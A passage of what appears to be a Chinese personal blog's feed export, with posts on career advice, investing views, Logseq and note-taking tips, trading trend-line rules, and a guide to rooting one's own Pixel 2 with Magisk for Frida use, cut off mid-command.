“销售”</h2><p>光有自信心是不够的，你还必须能够说服其他人相信你的想法。</p><p>所有伟大的事业，在某种程度上，都成为销售工作。你必须向客户、未来的员工、媒体、投资者等宣扬你的计划。这需要一个鼓舞人心的愿景，强大的沟通技巧，一定程度的魅力，以及执行能力的证明。</p><p>善于沟通，特别是书面沟通，是一项值得投资的工作。我对清晰沟通的最佳建议是，首先确保你的思路清晰，然后使用平实、简明的语言。</p><p>做好销售的最好方法是真正相信你所销售的东西。销售你真正相信的东西感觉很好，而试图销售蛇油的感觉很糟糕。</p><p>擅长销售就像提高其他技能一样，任何人都可以通过刻意练习而变得更好。但出于某种原因，也许是因为它让人感到厌恶，许多人把它当作无法学习的东西。</p><p>我的另一个重要的销售建议是在重要的时候亲自出面。当我刚开始工作时，我总是愿意坐飞机。这经常是不必要的，但有三次它导致了我的职业生涯的转折点，否则就会走到另一个方向。</p><h2 id="5-让人容易承担风险"><a href="#5-让人容易承担风险" class="headerlink" title="5.让人容易承担风险"></a>5.让人容易承担风险</h2><p>大多数人高估了风险，低估了回报。承担风险是很重要的，因为你不可能一直都是正确的，你必须尝试很多东西，并在你学到更多东西时迅速适应。</p><p>在你职业生涯的早期，往往更容易承担风险；你没有什么损失，而你有可能获得很多。一旦你让自己的基本义务得到保障，你就应该试着让自己容易承担风险。寻找你可以做的小赌注，如果你错了，你会损失1倍，但如果成功了，会赚100倍。然后朝着这个方向做一个更大的赌注。</p><p>不过，不要积攒太久。在YC，我们经常注意到那些在谷歌或Facebook工作了很长时间的创始人的一个问题。当人们习惯了舒适的生活，可预测的工作，以及无论做什么都能成功的声誉时，就很难将其抛在脑后（人们有一种难以置信的能力，总是将自己的生活方式与明年的工资相匹配）。即使他们真的离开了，返回的诱惑也很大。将短期利益和便利性置于长期成就之上是很容易的，也是人类的天性。 </p><p>但是，当你不在跑步机上时，你可以跟随你的直觉，把时间花在那些可能变成真正有趣的事情上。在尽可能长的时间内保持你的生活廉价和灵活是一个强大的方法，但显然是有代价的。</p><h2 id="6-专注"><a href="#6-专注" class="headerlink" title="6. 专注"></a>6. 专注</h2><p>专注是工作中的一种力量倍增器。</p><p>我见过的几乎每个人都会花更多的时间来思考该专注于什么。在正确的事情上工作比在许多时间上工作要重要得多。大多数人把大部分时间浪费在不重要的事情上。</p><p>一旦你想清楚了要做什么，就要势不可挡地迅速完成你那一小撮优先事项。我还没有见过一个行动缓慢的人非常成功。</p><h2 id="7-努力工作"><a href="#7-努力工作" class="headerlink" title="7. 努力工作"></a>7. 努力工作</h2><p>你可以通过聪明或努力工作达到你所在领域的第90个百分点，这仍然是一个伟大的成就。但是，要想达到第99百分位数，则需要两者兼备–你将与其他非常有才华的人竞争，他们会有很好的想法，并愿意付出很多努力。</p><p>极端的人得到极端的结果。大量工作伴随着巨大的生活权衡，决定不这样做是完全理性的。但它也有很多优点。就像在大多数情况下一样，势头会越来越大，成功会带来成功。</p><p>而且它往往非常有趣。生活中最大的乐趣之一是找到你的目的，在这方面表现出色，并发现你的影响比你自己更重要。一位YC的创始人最近表示非常惊讶，在离开大公司的工作后，他变得更加快乐和充实，并为自己的最大影响力而努力。在这一点上努力工作应该得到赞许。 </p><p>我并不完全清楚为什么在美国的某些地方，努力工作已经成为一件坏事，但在世界其他地方肯定不是这样的–美国以外的企业家所表现出来的能量和动力正迅速成为新的基准。</p><p>你必须弄清楚如何努力工作而不至于筋疲力尽。人们为此找到自己的策略，但有一个几乎总是有效的策略是找到你喜欢的工作，与你喜欢花很多时间的人一起工作。</p><p>我认为那些假装你可以在职业上取得巨大成功而不需要大部分时间（在你生命中的某个时期）工作的人是在做一件坏事。事实上，工作耐力似乎是长期成功的最大预测因素之一。</p><p>关于努力工作还有一个想法：在你的职业生涯开始时就努力工作。艰苦的工作就像利息一样复利，你越早做，你就有越多的时间来获得回报。当你有较少的其他责任时，也更容易努力工作，这在你年轻的时候经常发生，但并不总是这样。</p><h2 id="8-大胆一点"><a href="#8-大胆一点" class="headerlink" title="8. 大胆一点"></a>8. 大胆一点</h2><p>我相信，做一个艰难的创业公司比做一个容易的创业公司更容易。人们希望成为令人兴奋的事情的一部分，并感到他们的工作很重要。</p><p>如果你在一个重要的问题上取得了进展，你将会有一个持续的尾巴，人们想要帮助你。让自己变得更有野心，不要害怕从事你真正想做的工作。</p><p>如果其他人都在创办备忘录公司，而你想创办一家基因编辑公司，那就去做，不要猜测。</p><p>遵循你的好奇心。对你来说似乎很兴奋的事情，往往也会让其他人感到兴奋。</p><h2 id="9-要有意志力"><a href="#9-要有意志力" class="headerlink" title="9.要有意志力"></a>9.要有意志力</h2><p>一个很大的秘密是，你可以在令人惊讶的时间内使世界屈服于你的意志，大多数人甚至没有尝试，而只是接受事情是他们的方式。</p><p>人们有一种巨大的能力来使事情发生。自我怀疑、过早放弃和不够努力等因素结合在一起，使大多数人无法达到接近其潜力的程度。</p><p>要求得到你想要的东西。你通常不会得到它，而且往往拒绝会很痛苦。但当这一方法奏效时，它的效果出奇地好。</p><p>几乎总是这样，那些说 “我要一直走下去，直到成功为止，不管有什么挑战，我都要把它们解决掉 “的人，并且是认真的，会继续取得成功。他们坚持了足够长的时间，给自己一个机会，让幸运降临到他们身上。</p><p>Airbnb是我在这方面的基准。他们有很多故事，我不建议尝试复制（把刷爆的信用卡放在孩子们用来装棒球卡的九槽三环夹子里，每顿都吃一元店的麦片，与强大的利益集团进行一场又一场的斗争，等等），但他们设法生存了足够长的时间，让运气顺着他们。</p><p>要想成为有意志力的人，你必须要乐观–希望这是一个可以通过实践来改善的人格特质。我从未见过一个非常成功的悲观主义者。</p><h2 id="10-很难与之竞争"><a href="#10-很难与之竞争" class="headerlink" title="10. 很难与之竞争"></a>10. 很难与之竞争</h2><p>大多数人都明白，如果公司难以与之竞争，就更有价值。这很重要，显然也是事实。</p><p>但这对作为个人的你也是如此。如果你所做的事情可以由别人来做，那么最终就会由别人来做，而且花的钱更少。</p><p>变得难以与之竞争的最好方法是建立杠杆。例如，你可以通过个人关系，通过建立一个强大的个人品牌，或者通过在多个不同领域的交叉点上获得优势来做到这一点。还有许多其他策略，但你必须想出一些办法来做。</p><p>大多数人做他们所交往的大多数人做的事。这种模仿行为通常是个错误–如果你做的是别人都在做的事情，你将不难与之竞争。</p><h2 id="11-建立一个网络"><a href="#11-建立一个网络" class="headerlink" title="11. 建立一个网络"></a>11. 建立一个网络</h2><p>伟大的工作需要团队。发展一个由有才华的人组成的工作网络–有时是紧密的，有时是松散的–是伟大事业的一个重要组成部分。你所认识的真正有才华的人的网络的大小往往成为你能取得成就的限制因素。</p><p>建立网络的一个有效方法是尽可能地帮助别人。在很长一段时间内，这样做是导致我最好的职业机会和我四个最好的投资中的三个的原因。我不断感到惊讶，因为我十年前帮助一位创始人的事情，经常有好事发生在我身上。</p><p>建立网络的最好方法之一是建立一个真正照顾到与你合作的人的声誉。要过分慷慨地分享好处；这将会给你带来10倍的回报。另外，学会如何评估人们的长处，并让他们担任这些职务。(这是我在管理方面学到的最重要的东西，而我并没有读过很多这方面的书）。你要有一个口碑，那就是把人逼得够狠，使他们的成就超过他们的想象，但又不至于让他们倦怠。</p><p>每个人在某些方面都比其他人强。用你的优势来定义你自己，而不是你的弱点。承认你的弱点并想办法解决它们，但不要让它们阻止你做你想做的事。”我不能做X，因为我不擅长Y”，这是我经常从企业家那里听到的，而且几乎总是反映出缺乏创造力。弥补你的弱点的最好方法是雇用互补的团队成员，而不是仅仅雇用那些擅长你所做的同样事情的人。</p><p>建立网络的一个特别有价值的部分是要善于发现未被发现的人才。通过练习，快速发现智慧、动力和创造力变得更加容易。最简单的学习方法就是认识很多人，并跟踪谁会给你留下深刻印象，谁不会。记住，你主要是在寻找改进的速度，不要高估经验或当前的成就。</p><p>当我遇到新的人时，我试着总是问自己：”这个人是一个自然的力量吗？” 这是一个相当好的启发式方法，可以找到那些有可能完成伟大事业的人。</p><p>发展网络的一个特殊情况是找到知名人士为你下注，最好是在你职业生涯的早期。要做到这一点，毫不奇怪，最好的办法是不遗余力地提供帮助。(请记住，你必须在以后的某个时间点上把这些钱交出来！）。</p><p>最后，记得把你的时间花在支持你雄心壮志的积极人士身上。</p><h2 id="12-你通过拥有东西而致富"><a href="#12-你通过拥有东西而致富" class="headerlink" title="12. 你通过拥有东西而致富"></a>12. 你通过拥有东西而致富</h2><p>我童年时最大的经济误区是人们通过高薪致富。虽然有一些例外–例如娱乐界人士–但在福布斯榜单的历史上，几乎没有人是靠工资获得的。</p><p>你通过拥有快速增值的东西来获得真正的财富。</p><p>这可以是一个企业的一部分，房地产，自然资源，知识产权，或其他类似的东西。但无论如何，你需要拥有某些东西的股权，而不是仅仅出售你的时间。时间只是线性扩展的。</p><p>制造快速增值的东西的最好方法是大规模制造人们想要的东西。</p><h2 id="13-要有内部驱动力"><a href="#13-要有内部驱动力" class="headerlink" title="13. 要有内部驱动力"></a>13. 要有内部驱动力</h2><p>大多数人主要是受外部驱动；他们做他们所做的事是因为他们想给其他人留下深刻印象。这有很多不好的原因，但这里有两个重要的原因。</p><p>首先，你将在协商一致的想法和协商一致的职业轨道上工作。 你会非常关心–比你意识到的要多得多–其他人是否认为你在做正确的事情。这可能会阻止你做真正有趣的工作，即使你做了，别人也会做。</p><p>第二，你通常会把风险计算弄错。你会非常专注于跟上别人的步伐，在竞争性游戏中不掉队，即使是在短期内。</p><p>聪明人似乎特别容易出现这种外在驱动的行为。意识到这一点有帮助，但只是一点点–你很可能要付出超强的努力才不会落入模仿的陷阱。</p><p>我所知道的最成功的人主要是由内部驱动的；他们所做的事情是为了给自己留下深刻印象，也是因为他们感到有必要在这个世界上有所作为。在你赚够了钱，可以买到你想要的任何东西，得到了足够的社会地位，不再以获得更多的东西为乐趣之后，这是我所知道的唯一的力量，会继续推动你达到更高的表现水平。</p><p>这就是为什么一个人的动机问题是如此重要。这是我试图了解一个人的第一件事。正确的动机很难定义一套规则，但当你看到它时，你就会知道它。</p><p>杰西卡-利文斯顿和保罗-格雷厄姆是我这方面的标杆。YC在最初几年被广泛嘲笑，在他们刚开始的时候几乎没有人认为它会大获成功。但他们认为，如果它能成功，对世界来说是件好事，而且他们喜欢帮助人，他们坚信他们的新模式比现有模式更好。</p><p>最终，你将通过在对你很重要的领域进行出色的工作来定义你的成功。你越早朝这个方向起步，你就能走得越远。你很难在你不痴迷的事情上取得巨大的成功。</p><h2 id="1-我在HN上写的一个评论回应。"><a href="#1-我在HN上写的一个评论回应。" class="headerlink" title="[1] 我在HN上写的一个评论回应。"></a>[1] 我在HN上写的一个评论回应。</h2><p>我对基本收入感到兴奋的最大原因之一是，它将通过释放更多的人去冒险而释放出大量的人类潜力。<br>在此之前，如果你不是天生的幸运儿，你必须在大摇大摆之前努力奋斗一阵子。如果你出生在极端贫困地区，那么这就超级困难了。</p><p>机会分配如此不均，显然是一种难以置信的耻辱和浪费。但是，我已经目睹了足够多的人出生在对他们非常不利的环境中，并取得了令人难以置信的成功，所以我知道这是可能的。</p><p>我深深地意识到，如果我不是生来就非常幸运，我个人就不会有现在的成就。</p><p>感谢布莱恩-阿姆斯特朗、格雷格-布罗克曼、道尔顿-考德威尔、戴安-冯-弗斯滕伯格、麦迪-霍尔、德鲁-休斯顿、维诺德-科斯拉、杰西卡-利文斯顿、乔恩-利维、卢克-迈尔斯（6稿！）、迈克尔-莫里茨、阿里-罗格尼、迈克尔-塞贝尔、彼得-泰尔、特蕾西-杨和希文-齐利斯对本稿的审核，特别感谢拉奇-格罗姆帮助撰写。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Archives</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>林园谈投资</title>
    <link href="/cn/linyuan_interview/"/>
    <url>/cn/linyuan_interview/</url>
    
    <content type="html"><![CDATA[<p>看了一个2012年采访林园的视频，每个成功的人士对投资都有自己的看法。 </p><ul><li>投资最重要的要少犯错</li><li>虽然没法预测股票走势，但是股票价格的高低还是需要清楚的，虽然价格低的可能继续走低，价格高的可能继续走高</li><li>投机和投资没有本质区别，投机的「机」是择时，价值投资也是择时，市场上的股票供需关系会影响价格</li><li>需要知道市场周期，牛熊轮回，不同的市场时期，选择的投资策略也不同</li><li>做3到5年的长线投资，关注市场的主线，在龙头股上赚大钱</li><li>注重风险管理，投资前测算最差情况，只在有把握时下注，平时不太看盘</li><li>使用资产配置来分摊风险，房地产、债券、股票等均有涉猎</li><li>每个人都有自己擅长的标的(能力圈)，林园的投资主线是和吃的有关系的消费股</li></ul><p>这篇采访出了个彩蛋🎉，主持人问林园平日都有啥爱好。林园说他有两个爱好：1. 逛夜总会 2. 走长路<br>林园逛夜总会的段子已经广泛流传，主持人也接不住这话茬 ：）认真分析 逛夜总会是看高端消费，走长路是看日常消费。<br>一般成功的投资人都有自己独特的指标。</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Logseq 使用小结 （三）</title>
    <link href="/cn/logseq3/"/>
    <url>/cn/logseq3/</url>
    
    <content type="html"><![CDATA[<p>使用 Logseq 写笔记已经大半年了，Logseq 是这么多年来除了 vim 之外，唯一可以在使用上螺旋上升的软件。我把 Logseq 推荐给媳妇，她用来写会议纪要，写备忘录，管理待办事项，也用得挺好。</p><p>Logseq 的成功之处在于它降低了记录的成本，不需要大段大段的文字，也不需要太多的文章结构，随时都可以记录。Logseq 比较严重的问题是它的使用太灵活了，前后记录的标准、格式、标签等要素可能不一致，容易造成笔记凌乱。笔记一凌乱就没法有效的聚合，笔记的有效聚合形成一个有意义的想法群是 Logseq 等双链软件和其他笔记软件相比最有价值的地方。</p><p>我这半年来总结出笔记系统成功的关键是： 在同一个地方，用同样的格式和一致的标准记录你的洞见。但是由于 Logseq 缺乏有效的工作流，没法自动化提示必要的步骤，只能通过不断的练习来强化学习。另外 Logseq 中 page 和 tag 只是起到过滤笔记的作用，最关键的笔记之间的链接却很容易被忽视，tag 的数量一多又会开始笔记凌乱了。</p><p>总而言之，如果只是把 Logseq 作为备忘，或者简单作为信息记录，挺好用也不需要学习太多的东西，但是如果需要使用 Logseq 来实践卡片笔记法等 PKM 理论，恐怕还是需要花费一些功夫仔细琢磨一番。PKM 方面的书籍我强力推荐 《卡片笔记写作法》一书，中文翻译很不错，虽然书名是谈写作，里面的内容却涉及很广，我自己阅读后收益良多。</p><p>就实践卡片笔记法来说，浮墨是一个比较理想的工具，「少即是多，多则惑」，去掉一切不需要的功能，重点才能突出。Logseq 的野心挺大，不想只做一个双链笔记本，还想做得更多，这就要求我们想清楚使用其的主要目的是什么。现实中并不存在一个 all in one 的理想工具，什么工具合适就可以使用什么工具，各位施主不能 「着相」了。</p><p>上面说的是一些「道」层面的东西， Logseq 在「术」方面的东西也不少，下面将介绍一些前两篇尚未涉及的功能和使用技巧。</p><h2 id="☆-使用-properties"><a href="#☆-使用-properties" class="headerlink" title="☆ 使用 properties"></a>☆ 使用 properties</h2><p><a href="https://docs.logseq.com/#/page/term%2Fproperties">https://docs.logseq.com/#/page/term%2Fproperties</a></p><p>在 Logseq 中有两种 properties， page properties 和 block properties。</p><ul><li>Page properties 在第一个 block 写 <code>property:: value</code>  </li><li>Block properties 在每个 block 内使用 <code>property:: value</code></li></ul><p>在使用 block properties 时，需要输入 <code>shift + Enter</code> 来进行换行，换行后输入 <code>::</code> Logseq 会自动提示已经使用过的 property。理解 properties 可以简单的把 block 看成数据库的一条记录， properties 就是不同的字段，可以通过 Logseq 的 query 来查询相关记录。在使用 properties 时可以引用 page 或者 tag，可以通过这种方法来索引这条记录。</p><p>例如，我将书籍的 block 都添加了 <code>category:: Books</code> 的属性，后续可以使用 <code>&#123;&#123;query (property category Books) &#125;&#125;</code> 来查询所有书籍了，感觉上有点类似 notion 的表格。</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_1.png"></p><h2 id="☆-使用-Scheduled-制定计划"><a href="#☆-使用-Scheduled-制定计划" class="headerlink" title="☆ 使用 &#x2F;Scheduled 制定计划"></a>☆ 使用 &#x2F;Scheduled 制定计划</h2><p>使用 Schedule 的功能的方法比较简单，在写完一条 block 后，输入 <code>shift + enter </code> 换行后，输入 <code>/Scheduled</code> 在弹出的界面中选择时间周期即可。</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_2.png"></p><p>在 Schedule 规定的时间内，Logseq 的 Journals 页面可以看到相关的内容。</p><h2 id="☆-使用模板-（Template）"><a href="#☆-使用模板-（Template）" class="headerlink" title="☆ 使用模板 （Template）"></a>☆ 使用模板 （Template）</h2><p><a href="https://docs.logseq.com/#/page/templates">https://docs.logseq.com/#/page/templates</a></p><p>使用模板的好处是可以避免重复性的劳动，比如你希望在 Journals 页面里按照 [[每日工作]] [[每日心得]] 的固定格式来记录，那么你需要在每天重复输入一次。但如果你制作一个固定模板，就可以使用 <code>/Template</code> 命令来完成自动化的输入。</p><p>制作模板的过程可以参考 Logseq 官方的动画，简单说就是写一个 block，这个 block 包含了必要的结构，在 block 前面的圆点点击鼠标右键 -&gt; Make template，再输入模板的名字就完成了。在后续的使用过程中，输入 <code>/Template</code> 后在弹出的界面选择对应的模板名就可以完成自动化的输入。</p><h2 id="☆-一些好用的插件"><a href="#☆-一些好用的插件" class="headerlink" title="☆ 一些好用的插件"></a>☆ 一些好用的插件</h2><p>插件可以拓展 Logseq 的功能，使用插件的方法在 <a href="https://www.usmacd.com/2022/03/07/logseq2/">Logseq 使用小结 （二）</a> 中有详细介绍，这里就不再细说。</p><h3 id="Logseq-Plugin-Tabs"><a href="#Logseq-Plugin-Tabs" class="headerlink" title="Logseq Plugin Tabs"></a>Logseq Plugin Tabs</h3><p><a href="https://github.com/pengx17/logseq-plugin-tabs">https://github.com/pengx17/logseq-plugin-tabs</a></p><p>Plugin Tabs 像打开浏览器一样打开 pages 或者 blocks，对于内容比较多的 page，这个插件非常实用。</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_4.png"></p><h3 id="logseq-plugin-mark-map"><a href="#logseq-plugin-mark-map" class="headerlink" title="logseq-plugin-mark-map"></a>logseq-plugin-mark-map</h3><p><a href="https://github.com/vipzhicheng/logseq-plugin-mark-map">https://github.com/vipzhicheng/logseq-plugin-mark-map</a></p><p>Mark map 可以自动化地把你的笔记用导图的形式输出，方便展示和记忆。</p><p><img src="https://github.com/henices/pictures/raw/master/logseq3_5.png"></p><h2 id="☆-一些使用上的小技巧"><a href="#☆-一些使用上的小技巧" class="headerlink" title="☆ 一些使用上的小技巧"></a>☆ 一些使用上的小技巧</h2><ul><li>Logseq content wide mode  可以使用快捷键切换 <code>t w</code>  </li><li>Logseq 的 property 可以通过输入 <code>::</code> 来触发自动补全操作，非常方便。  </li><li>Logseq 使用快捷键 <code>Cmd + Shift + i</code> 可以打开 devtools  </li><li>Logseq v0.68，自动补全提供两个快捷键 <code>mod+p</code> 和 <code>mod+n</code> 比较方便了  </li><li>Logseq 可以使用 <code>command + </code> 和 <code>command -</code> 来放大或者缩小 Logseq 的字体大小  </li><li>Logseq 0.7.1 新功能：Copy &amp; Paste with rich-text formats，如果粘贴时不想保留格式 <code>mod + shift + v</code>  </li><li>Logseq 移动光标的快捷键：<code>mod + p</code> 向上移动光标，<code>mod + n</code> 向下移动光标  </li><li>Logseq Markdown 语法支持 <code> Horizontal Rules</code>，可以使用 <code>---</code>分隔卡片笔记。</li></ul><p>mod 在 windows 和 linux 系统中是 <code>ctrl</code>， 在 macOS 系统中是 <code>command</code></p><h2 id="☆-参考链接"><a href="#☆-参考链接" class="headerlink" title="☆  参考链接"></a>☆  参考链接</h2><p><a href="https://www.usmacd.com/cn/logseq/">https://www.usmacd.com/cn/logseq/</a><br><a href="https://www.usmacd.com/cn/logseq2/">https://www.usmacd.com/cn/logseq2/</a><br><a href="https://www.usmacd.com/cn/logseq_plugins/">https://www.usmacd.com/cn/logseq_plugins/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于笔记的一些思考</title>
    <link href="/cn/note/"/>
    <url>/cn/note/</url>
    
    <content type="html"><![CDATA[<ul><li><p>Random Notes (漫游笔记) 的技术原理是用新视角去审视旧想法，和自己以前的想法不期而遇的感觉非常奇妙。总体来说人是会不断进步的，经过一段时间后再去重温自己某个时刻的想法，可能以前的一些疑惑现在已经没有了，也可能对某个问题有了更进一步的思路，这是促使想法迭代的一种方法。</p></li><li><p>想要做到想法的自然迭代，必要的条件是可以马上回到过去的某个时刻，而且那个时刻的上下文没有丢失，如果上下文丢失意味着已经看不懂以前的笔记了，自然也就没有了迭代的可能性。</p></li><li><p>卡片盒笔记法要求用完整的句子精要简述想法，笔记之间的连接则补充了上下文，为想法迭代创造了有利条件。</p></li><li><p>写永久笔记时，应该假设读者对文本背后的思想，原文背景一无所知，只具备相关的领域知识。这里的读者其实也包括未来的自己，我们写下永久笔记后，很快就会将其的上下文遗忘，就想从没有见过该笔记的其他读者一样。</p></li><li><p>我们应该寻找与我们观点相反的论点或者事实来挑战我们的既有思维，但是受「确认偏差」的影响，我们会不经意的忽略这些信息，那些和我们观点一致的信息有很大吸引力，因为这些信息可以证明自己很博学。解决 「确认偏差」的方法：把寻找证实性信息变为收集所有信息，不需要关注这些信息支持的具体观点。</p></li><li><p>我们使用卡片盒笔记法，对习惯最重要的转变是将注意力从个别项目的预设立场变成思考笔记之间的开放性联系。通过一段时间的训练，在阅读过程中我们可以轻松找出与预设观点相悖的信息。当这些信息改变我们对某些问题的看法时，我们会感到相当兴奋，从而慢慢喜欢上这种感觉。</p></li><li><p>在实践卡片笔记法的过程中，会遇上一整天都没写一张卡片的时候，而有的时候则一天写十多张卡片。限制每天写笔记的数量可以让写卡片盒笔记的过程更加轻松，避免了过于放松的状态，也避免了过于紧绷的状态，有利于我们保持良好的状态, 也有利于提高笔记的质量，让你选择笔记内容时更加挑剔。</p></li><li><p>你可以将目标设置为每天写3条笔记，或者每年出一本书，仍然可以在合理的时间内积累大量的想法。</p></li><li><p>卡片笔记法属于自下而上的发散思维，发散思维有个问题，就是无法把握发散的度。为了应对这个问题，卢曼提出的办法是仔细思考笔记之间的联系，写笔记时参考文献笔记和自己以前写的笔记，定期自上而下制作索引卡片，这些做法的目的是避免想法过于太发散。</p></li><li><p>思维需要发散，但是领域需要聚焦，我们在自己的专业，财务等领域是需要不断精进的，这两个方面似乎是矛盾的。</p></li><li><p>最近的研究发现可以使用 P.A.R.A. 来组织顶层结构，统领需要精进的领域，在具体想法的记录上则继续使用卡片笔记法。这种方法使用 P.A.R.A. 不断推动自己在关注领域的取得进展，又能在关键的思考上使用卡片笔记法，自用一段时间感觉不错。</p></li><li><p>我以前认为笔记杂乱的原因是是笔记缺乏组织结构，实践结果表明良好的分类确实有一定帮助，但是不是最重要的。最重要的是在同一个地方，用同样的格式和一致的标准记录你的洞见。</p></li><li><p>把笔记保存在同一个地方避免了笔记分散，迁移也比较方便。同样的格式和一致的标准则为笔记之间的联系与聚合创造了有利条件。另外，当我们以一致的标准写笔记时阻力是最小的，关注的是笔记的内容，形式等外在的东西则变得不再重要。</p></li><li><p>新的观点、新的洞见、新的想法，是笔记系统中最有价值的东西。笔记系统应该侧重于知识的积累而不是信息的积累。</p></li><li><p>没有记录基本就等于没有学习，不论记性多好都会随着年龄的增大而逐渐忘记，所以不断记录，不断总结，不断分析，才能螺旋前进。</p></li></ul><p>未完，待续 …</p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>专业投机原理中的技术分析法则摘要</title>
    <link href="/cn/trader_vic/"/>
    <url>/cn/trader_vic/</url>
    
    <content type="html"><![CDATA[<p>有关金融市场方面的书我个人的图书馆里至少有1200本。它们主要是讨论证券分析、期权策略、期货策略、技术分析以及其他相关方面的书。这些书大多都包含相当不错的构想，其中约2%是真正优秀的作品。然而，它们大多存在一个共同的问题：试图推销一种“战胜市场”的方法，很多方法甚至没有经过实际市场的完整测试。</p><h2 id="如何正确的绘制趋势线"><a href="#如何正确的绘制趋势线" class="headerlink" title="如何正确的绘制趋势线"></a>如何正确的绘制趋势线</h2><p>使用以下方法绘制趋势线可以提供一致而精确的结果，而且绝对不会产生错误的信号：</p><ol><li>选择考虑的时间：长期（数月至数年）、中期（数个星期至数月）或短期（数天至数个星期）。</li><li>上升趋势线：在考虑的时间内，以最低的低点为起点，向右上方绘制一条直线，连接最高点前的某一个低点，使这条直线在两个低点之间未穿越任何价位。延伸这条直线而经过最高点（这是指水平轴上的位置而言）。趋势线经过所考虑的最高点以后，它可能穿越某些价位。事实上，这是趋势发生变化的一种现象。</li><li>下降趋势线：在考虑的时间内，以最高的高点为起点，向右下方绘制一条直线，连接最低点前的某一个高点，而使这条直线在两个高点之间未穿越任何价位。延伸这条直线而经过最低点。</li></ol><p>这个方法的优点在于其明确性，并可以用来判断趋势是否可能变动或已经变动。</p><h2 id="确立趋势变动的-123-法则"><a href="#确立趋势变动的-123-法则" class="headerlink" title="确立趋势变动的 123 法则"></a>确立趋势变动的 123 法则</h2><ul><li>股价突破趋势线</li><li>上升趋势回档后，不创新高；下降趋势反弹后，不创新低</li><li>上升趋势跌破上一个回档低点，下降趋势突破上一个反弹高点</li></ul><h2 id="风险报酬比很不错的-2B法则"><a href="#风险报酬比很不错的-2B法则" class="headerlink" title="风险报酬比很不错的 2B法则"></a>风险报酬比很不错的 2B法则</h2><p>上升趋势中价格创新高后，并未持续上涨，而后又跌破先前的高点，则趋势很可能反转。</p><h2 id="具有统计学优势的四天准则"><a href="#具有统计学优势的四天准则" class="headerlink" title="具有统计学优势的四天准则"></a>具有统计学优势的四天准则</h2><p>在中期走势中，当市场在高点或者低点以连续四天下跌或上涨的走势而呈<strong>反转</strong>时，趋势可能发生变化。 （和趋势方向相反的连续四根K线）</p><h2 id="四天准则辅助准则"><a href="#四天准则辅助准则" class="headerlink" title="四天准则辅助准则"></a>四天准则辅助准则</h2><p>当中期走势发展到相当程度以后，如果出现顺势的四天（或者以上）排列，随后出现第一天的逆趋势行情，经常代表趋势变动的顶部或者底部。</p><h2 id="三天高低价准则"><a href="#三天高低价准则" class="headerlink" title="三天高低价准则"></a>三天高低价准则</h2><p>三天的高低价准则，是运用最近三天的盘中高价与低价。当价格发生反转而穿越三天的高价或低价时，则做多或卖空，并以第三天的低价或高价作为止损点。 <strong>这个准则必须配合另一个确认原则。</strong></p><h2 id="缺口准则"><a href="#缺口准则" class="headerlink" title="缺口准则"></a>缺口准则</h2><p>缺口准则很简单，当趋势线上方或者下方出现缺口时，它反映重大变化（消息面或基本面），并显示趋势可能发生变动。该准则并不需要2B，也不需要经过试探（趋势线）。<br>然而，缺口必须穿越趋势线，该准则才有效。 <strong>这个准则必须配合另一个确认原则。</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>root Pixel2 Android 11 的方法</title>
    <link href="/cn/root_android11_pixel2/"/>
    <url>/cn/root_android11_pixel2/</url>
    
    <content type="html"><![CDATA[<p>要正常使用 frida 首先需要把手机给 root 了， 在最近测试的情况发现 Android 10 和 Android 11 系统工作比较正常， Android 6 和其他系统似乎差一些？</p><p>要刷机首先需要下载 <code>adb</code> 等工具，这些工具由 Android 的 SDK platform tools 提供，下载地址为：<a href="https://developer.android.com/studio/releases/platform-tools">https://developer.android.com/studio/releases/platform-tools</a><br>选择相应的操作系统版本下载即可， Google 提供了 Windows、Linux、Mac 等系统的支持。</p><p>基础镜像可以选择的 Google 的官方镜像 Factory Image，如果能自己编译 Android 系统则更好，在调试的时候可以看到系统库的符号。</p><p>我的 Android 手机为 Pixel 2 在 <a href="https://developers.google.com/android/images#walleye">https://developers.google.com/android/images#walleye</a> 上可以查找相应的镜像， 下个最新的 <a href="https://dl.google.com/dl/android/aosp/walleye-rp1a.201005.004.a1-factory-0c23f6cf.zip">https://dl.google.com/dl/android/aosp/walleye-rp1a.201005.004.a1-factory-0c23f6cf.zip</a></p><p>要想刷镜像前提条件是先要解锁 bootloader， Pixel2 新手机解锁的命令和以前有变化，可以参考 <a href="https://source.android.com/devices/bootloader/locking_unlocking">https://source.android.com/devices/bootloader/locking_unlocking</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb reboot bootloader<br>fastboot flashing unlock_critical<br></code></pre></td></tr></table></figure><p>下载解压后，里面有个 flash-all 的脚本，将手机重启到 fastboot 模式后可以直接运行， <code>adb reboot bootloader</code>， 重启到 fastboot 模式后，执行 flash-all 脚本，刷机系统镜像就完成了。</p><p>以前 root  Android 用的都是 SuperSU 和 TWRP， 这次使用了一个不同的方法 <a href="https://github.com/topjohnwu/Magisk">Magisk</a> ， 安装的方法参见：<br><a href="https://topjohnwu.github.io/Magisk/install.html">https://topjohnwu.github.io/Magisk/install.html</a></p><p>有两种模式， patch boot 或者 patch recovery， 安装 Magisk app 后如果界面显示  <code>Ramdisk：Yes</code>，则需要 patch boot。<br>Magisk app 的下载地址 <a href="https://github.com/topjohnwu/Magisk/releases/download/v23.0/Magisk-v23.0.apk">https://github.com/topjohnwu/Magisk/releases/download/v23.0/Magisk-v23.0.apk</a></p><p>安装 Magisk app 后， 选择需要 patch 的镜像文件，选择后会自动生成新的修改过后的镜像文件。<br>获得修改后的镜像文件后，需要将修改后的镜像文件重新刷一次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fastboot flash boot /path/to/magisk_patched.img <span class="hljs-comment">#or fastboot flash recovery 